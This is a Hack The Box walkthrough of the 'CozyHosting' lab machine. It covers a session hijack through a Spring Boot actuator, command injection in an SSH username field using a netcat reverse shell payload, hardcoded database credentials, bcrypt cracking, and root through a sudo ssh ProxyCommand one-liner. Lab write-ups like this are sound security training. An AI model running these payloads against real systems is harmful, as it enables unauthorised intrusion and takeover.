Tags: #Linux/Ubuntu #Easy #Nginx #Spring-Boot #Session-Hijacking #Information-Disclosure #Command-Injection #Hardcoded-Creds #Weak-Passwords #Sudo-Misconfiguration 
# **Nmap Results**

```text
Nmap scan report for 10.10.11.230
Host is up (0.019s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
```
<br>
<br>

# **Service Enumeration**
First look at the site:

![[Pasted image 20250624134651.png]]

Feroxbuster discovers the page **/error** that returns a 500 Internal Server Error, but looking at it from the browser, something's different:

![[Pasted image 20250624134928.png]]

It says "Whitelabel Error Page" instead. A quick google search of this error message reveals the back end framework to be **Spring Boot**.

Initially, Feroxbuster didn't find anything, but we can download a wordlist tailored for spring boot and run it again to see if anything is exposed. I'll use [this one](https://github.com/emadshanab/DIR-WORDLISTS/blob/main/spring-boot.txt)

![[Pasted image 20250624135527.png]]

**/actuator** looks interesting. Let's take a look:

![[Pasted image 20250624135632.png]]

**/actuator/sessions** contains a cookie for a user that's already logged in:

![[Pasted image 20250624135802.png]]

Using dev tools, paste this in and head to **/admin**:

![[Pasted image 20250624142123.png]]

At the bottom, you can fill out SSH information and it will try to connect to that machine. There ends up being a **Command Injection** vulnerability in the Username parameter, which we will exploit using burp.
<br>
<br>
# **Exploitation**
## **Initial Access**
Intercept the request after hitting the Submit button and send it to the repeater:

![[Pasted image 20250624142503.png]]

The format for an SSH command is `ssh user@hostname`. We're injecting into the user field.

When trying `test@localhost; whoami`, the server responds with "Username can't contain whitespaces!", so we have to use URL encoded tab characters ("\t")

Inject a reverse shell payload: `busybox nc 10.10.14.14 9001 -e sh`:

![[Pasted image 20250624143600.png]]

A shell was returned after sending the request:

![[Pasted image 20250624143538.png]]

There's a Java .jar file in the directory we landed in. Copy to your system for analysis:

![[Pasted image 20250624144106.png]]

Extract the archive using 7z

Now run `find . -name *.properties` to find property files that could contain useful information. There are 2 results:

```
./BOOT-INF/classes/application.properties
./META-INF/maven/htb.cloudhosting/cloudhosting/pom.properties
```

Contents of the first one:

```
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

Credentials for a PostgreSQL database are at the bottom, and it runs on port 5432. 

Log in to PostgreSQL using these creds with `psql -U postgres -h localhost -p 5432`. It will prompt for password

List databases using `\l+`. We want to connect to the **cozyhosting** one, so log out and log back in with the `-d cozyhosting` option.

List tables and their schema with `\dt`, the users table probably contains useful information.

`SELECT * FROM users;` gives us the password hash to **admin** and **kanderson**:

![[Pasted image 20250624160238.png]]

Hashes.com says the hash type for both is bcrypt.

Hashcat was able to crack admin's password and found it to be `manchesterunited`. It failed to find kanderson's. 

Aside from app, there's another user named **josh**. Admin's password ended up being Josh's password for SSH 
<br>
<br>
# **Privilege Escalation**  
Output of `sudo -l`:

![[Pasted image 20250624161647.png]]

Josh can run `ssh` as root with any arguments he wants. 

According to this [GTFObins](https://gtfobins.github.io/gtfobins/ssh/) page, if you execute `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`, a root shell will spawn automatically

> [!info] SSH Payload Explained
>This payload abuses the **ProxyCommand** option to force SSH to spawn a privileged shell. Normally, this option is used when direct SSH access to a remote machine isn't allowed. Clients would set this flag to another command (usually ssh) that routes a connection through an intermediary server, and then to the target. In order for the routing path to be set properly, the proxy command has to execute before attempting the real connection the client wants
>
>In this case, instead of the command being ssh, it's a shell with root privileges (because of sudo) and proper I/O redirection so you can interact with it from the terminal. SSH then tries to connect to host "x", but fails because it's not an actual host. That doesn't matter though because we just need a shell
<br>
<br>
# Skills Learned
* A Java JAR file can contain useful information. To find out, exfil it to your system, extract the archive contents, and look through it. Property files are a potential source of info. To see if there are any, run `find . -name *.properties`. 
<br>
<br>
# Proof of Pwn
https://www.hackthebox.com/achievement/machine/391579/559